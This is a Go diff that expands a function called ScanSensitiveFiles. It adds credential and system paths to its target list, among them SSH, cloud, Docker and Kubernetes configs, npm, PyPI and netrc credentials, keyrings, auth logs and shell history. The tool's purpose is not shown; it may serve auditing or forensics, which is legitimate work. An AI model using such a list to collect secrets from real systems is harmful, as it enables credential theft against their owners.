@@ -73,18 +73,30 @@ func ScanSensitiveFiles(outputDir string) ([]string, error) {
 	homeDir, _ := os.UserHomeDir()
 
 	paths := []string{
-		filepath.Join(homeDir, ".ssh"),
-		filepath.Join(homeDir, ".aws"),
-		filepath.Join(homeDir, ".gnupg"),
-		filepath.Join(homeDir, ".git-credentials"),
-		filepath.Join(homeDir, ".docker"),
-		filepath.Join(homeDir, ".kube"),
-		filepath.Join(homeDir, ".config/gcloud"),
-		filepath.Join(homeDir, ".azure"),
-		filepath.Join(homeDir, ".openvpn"),
-		"/etc/passwd",
-		"/tmp/ssh-*",
-		DetectDefaultShell(),
+		filepath.Join(homeDir, ".ssh"),                  // SSH keys
+		filepath.Join(homeDir, ".aws"),                  // AWS credentials
+		filepath.Join(homeDir, ".gnupg"),                // GPG keys
+		filepath.Join(homeDir, ".git-credentials"),      // Git credentials
+		filepath.Join(homeDir, ".gitconfig"),            // Git global config
+		filepath.Join(homeDir, ".docker"),               // Docker config
+		filepath.Join(homeDir, ".kube"),                 // Kubernetes config
+		filepath.Join(homeDir, ".config/gcloud"),        // Google Cloud config
+		filepath.Join(homeDir, ".azure"),                // Azure config
+		filepath.Join(homeDir, ".openvpn"),              // OpenVPN config
+		filepath.Join(homeDir, ".profile"),              // User profile
+		filepath.Join(homeDir, ".npmrc"),                // NPM credentials
+		filepath.Join(homeDir, ".pypirc"),               // Python package repository credentials
+		filepath.Join(homeDir, ".netrc"),                // Netrc (generic credentials)
+		filepath.Join(homeDir, ".local/share/keyrings"), // Keyrings
+		"/etc/passwd",        // User information
+		"/etc/group",         // Group information
+		"/etc/hostname",      // System hostname
+		"/etc/hosts",         // Hosts file
+		"/etc/ssl",           // SSL certificates
+		"/var/log/auth.log",  // Authentication logs (Linux-specific)
+		"/var/log/secure",    // Secure logs (Red Hat/CentOS-specific)
+		"/tmp/ssh-*",         // Temporary SSH files
+		DetectDefaultShell(), // Shell history
 	}
 
 	var files []string
